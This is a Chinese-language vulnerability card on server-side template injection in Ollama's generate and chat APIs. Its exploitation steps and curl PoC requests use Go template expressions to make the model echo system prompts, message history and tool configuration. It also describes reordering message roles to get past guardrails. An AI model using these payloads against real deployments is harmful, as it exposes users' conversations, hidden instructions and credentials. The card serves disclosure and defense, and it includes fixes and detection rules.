---
id: web-golang-ollama-template-param-go-ssti-data-leak
title: Ollama /api/generate 用户可控 template 注入：Go text/template 读取 .System/.Messages/.Tools 并操纵提示词
type: scenario
domain: web
path: web/golang
technique: ollama-template-param-go-ssti
tags:
- golang
- ollama
- go-template
- ssti
- template-injection
- information-disclosure
- llm
- prompt-injection
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
affected_versions: ≤ v0.9.5（原文正文）；v0.9.6（图01 报告 Affected Version）；原文称写作时暂无官方修复版本
verification:
  verified_by: verifier-V165
  verified_at: '2026-11-06T13:31:37+08:00'
  notes: 已对照原文核对：template.Parse(req.Template)→Execute(values)，.Prompt/.System/.Messages/.Tools 可访问，图05-07 验证 {{.Prompt}}/{{.System}}/range .Messages；图01 huntr 报 CWE-1336/Critical 9.9/Affected v0.9.6 与正文 v0.9.5 表述均已按原样记录；跨用户历史读取依赖上层网关拼装，卡内已标注为边界；Go text/template 非 RCE 定级合理；未在本机执行 PoC
url: /docs/web/golang/web-golang-ollama-template-param-go-ssti-data-leak/
draft: false
kb_aliases:
- Ollama Template Injection
- Ollama 模板注入
- /api/generate template
- Go text/template SSTI
- .Messages 泄露
- .System 泄露
- Ollama 对话历史泄露
---

## 一句话结论

Ollama 的 `/api/generate` 与 `/api/chat` 在请求携带 `template` 参数时，会把它直接交给 Go `text/template` 的 `template.Parse()` 解析并执行；攻击者用 `{{.System}}`、`{{range .Messages}}...{{end}}`、`{{.Tools}}` 等模板表达式即可把服务端注入的 System Prompt、对话消息与工具配置渲染进发给模型的 Prompt，再借模型回显读取这些本不应暴露的内容，并可改写提示词结构。

## 原理

- **入口**：`server/routes.go` 的 `GenerateHandler`（以及 chat 处理路径）读取请求 JSON 中的 `template` 字段；当 `req.Template != ""` 时执行 `tmpl, err = template.Parse(req.Template)`，覆盖模型自带的模板。
- **解析不受信任输入**：`template/template.go` 的 `Parse(s string)` 直接 `template.New("").Option("missingkey=zero").Funcs(funcs).Parse(s)`，`s` 完全来自用户；没有白名单、没有转义、没有限制可访问字段。
- **执行时暴露 Values**：`Template.Execute` 把服务端构造的 `Values` 作为模板数据：
  - `.Prompt`、`.Suffix`、`.Think`、`.IsThinkSet`；
  - `.System`（整理后的 system 消息）；
  - `.Messages`（`[]api.Message`，含 Role/Content/Images/ToolCalls 等）；
  - `.Tools`（工具/插件配置）。
  Go `text/template` 支持字段访问、`range`、`index`、管道与内置函数（代码还注册了 `json` 等自定义函数），因此攻击者可以逐条遍历消息、格式化输出或只取特定字段。
- **泄露路径**：模板渲染结果会作为发送给 LLM 的 Prompt（`b.String()` → `prompt`），模型通常会把 Prompt 内容续写/复述到 `response` 中；攻击者读取响应即可获得 `.System`、`.Messages`、`.Tools` 的内容。原文用 `.Prompt` 注入 `SECRET_DATA_12345`、用 `.System` 与 `.Messages` 的 `range` 输出验证了这一点。
- **跨用户边界需要部署条件**：直接调用 Ollama 时，`.Messages`/`.System` 通常来自本次请求（调用者自己提供）。只有当上层应用/网关把服务端掌握的 System Prompt、其他会话历史或工具密钥拼进 Ollama 请求，同时又把 `template` 参数暴露给用户时，才会造成跨用户/跨信任边界的数据泄露；原文“任意用户获取别人对话历史”的表述依赖这种部署，示教请求本身没有证明跨用户读取。
- **为何不是 RCE**：Go `text/template` 默认不提供任意函数调用或反射式命令执行；其危害主要是读取模板数据、改写 Prompt、调用 `Values` 暴露的导出方法。若自定义 `funcs` 或数据类型带有危险方法，影响可能扩大，但不能把本漏洞直接等同于命令执行。

## 触发条件

- 目标为 Ollama `≤ v0.9.5`（原文正文；图01 报告标记受影响版本 `v0.9.6`），且 `/api/generate` 或 `/api/chat` 可达（默认 `:11434`，Ollama 默认无认证）。
- 请求可以携带 `template` 字段，且 `raw` 不为 true（`raw=true` 时跳过模板路径）。
- 上层部署把敏感内容（System Prompt、对话历史、工具配置/密钥）放入 Ollama 请求的 `system`/`messages`/`tools` 字段；否则只能读取调用者自己提交的数据，危害有限。
- 模型愿意复述/续写渲染后的 Prompt，攻击者才能从响应中间接读到内容；若响应不回显，可尝试让模板把目标内容嵌入模型会重复的结构，或结合报错/长度差异判断。

## 利用步骤

1. 确认服务与版本：`GET /api/version`、`GET /api/tags` 选择可用模型。
2. 验证模板求值：向 `/api/generate` 发送 `template: "LEAKED:{{.Prompt}}"`，`prompt` 填一个标记串，观察响应是否包含标记，确认用户模板被解析。
3. 读取 System Prompt：`template: "{{.System}}"`，观察模型响应/续写内容。
4. 遍历对话历史：`template: "{{range .Messages}}Role:{{.Role}} Content:{{.Content}}|{{end}}"`，从响应中提取消息内容。
5. 读取工具配置：尝试 `{{.Tools}}` 或 `{{range .Tools}}...{{end}}`（字段名以实际 `api.Tools` 结构为准），寻找工具描述、参数或密钥。
6. 用 `{{printf "%v" .}}`、`{{json .}}` 等扩大输出；若模型不回显，可构造让模型必须复述的模板前缀。
7. 结合泄露的 System Prompt/历史继续做提示词注入、权限绕过或凭据利用。

## PoC

```bash
# 1) 版本与模型
curl -s http://localhost:11434/api/version
curl -s http://localhost:11434/api/tags
```

```bash
# 2) 验证 template 被解析：prompt 标记被渲染进模型输入
curl -s http://localhost:11434/api/generate \
  -H 'Content-Type: application/json' \
  -d '{
    "model": "qwen2.5:0.5b",
    "prompt": "SECRET_DATA_12345",
    "template": "LEAKED:{{.Prompt}}",
    "stream": false
  }'
```

```bash
# 3) 读取 System Prompt
curl -s http://localhost:11434/api/generate \
  -H 'Content-Type: application/json' \
  -d '{"model":"qwen2.5:0.5b","prompt":"test","template":"{{.System}}","stream":false}'
```

```bash
# 4) 遍历对话历史
curl -s http://localhost:11434/api/generate \
  -H 'Content-Type: application/json' \
  -d '{
    "model": "qwen2.5:0.5b",
    "prompt": "hi",
    "template": "{{range .Messages}}Role:{{.Role}} Content:{{.Content}}|{{end}}",
    "stream": false
  }'
```

原文在 Ollama v0.9.5 + qwen2.5:0.5b 上验证了上述请求；本卡未执行 PoC。

## 变体与关联

- **变体：`/api/chat`**：同一 `template` 参数在 chat 端点同样生效；chat 请求天然带 `messages`，更适合验证 `.Messages` 的读取。
- **变体：模板函数**：`Parse` 注册了 `json` 等函数，可把结构体整体序列化后送入 Prompt；`printf "%#v"` 也可展开字段。
- **变体：提示词操纵**：攻击者不读取数据，而是用模板重排/插入 System/User 回合，改变模型对消息角色的理解，绕过上层护栏或注入指令。
- **变体：模型自带模板**：若攻击者能修改 Modelfile/模型模板，同样可注入；参见 [[ai-security-supply-chain-llama-cpp-gguf-chat-template-jinja2-ssti-rce]]（GGUF chat_template 的 Jinja2 SSTI，可 RCE）。
- **关联**：[[web-generic-auth-ollama-unauth-api-model-management]]（Ollama 未授权 API 暴露）、[[ai-security-prompt-injection-chat-template-special-token]]（chat template 特殊 token 伪造回合）。
- **边界**：`raw=true` 绕过模板；上层网关剥离/固定 `template`；请求中不含敏感 System/Messages；模型拒绝复述或输出被过滤；Go text/template 本身不提供命令执行。原文未给出官方修复版本，升级前应以实际版本与厂商公告为准。

## 检测与防御

- **修复方向**：不要接受用户可控的 `template`；只允许模型 Modelfile/服务端配置中的模板，或在网关层直接剥离该字段。若业务确需自定义模板，使用字段/函数白名单并在沙箱中渲染，禁止 `.Messages`、`.Tools`、方法调用等敏感访问。
- **认证与隔离**：Ollama API 不应裸露在公网；前置认证代理、限制来源，按用户/租户隔离请求与模型实例，避免把他人历史拼进同一请求。
- **秘密管理**：不要把系统提示、API Key、工具凭据放进模板可访问的 `Values`；需要保密的内容留在服务端，模板只接收最小必要字段。
- **检测**：监控请求体含 `"template"` 且出现 `{{`、`.System`、`.Messages`、`.Tools`、`range`、`printf`、`json` 等特征；关注同一来源枚举模型、反复调用 `/api/generate` 并带异常模板；检查响应中是否出现系统提示/历史片段。
- **响应**：升级 Ollama 或应用网关规则，轮换可能泄露的模型/工具凭据，审计历史请求与对话记录，评估是否已有提示词注入或数据外带。
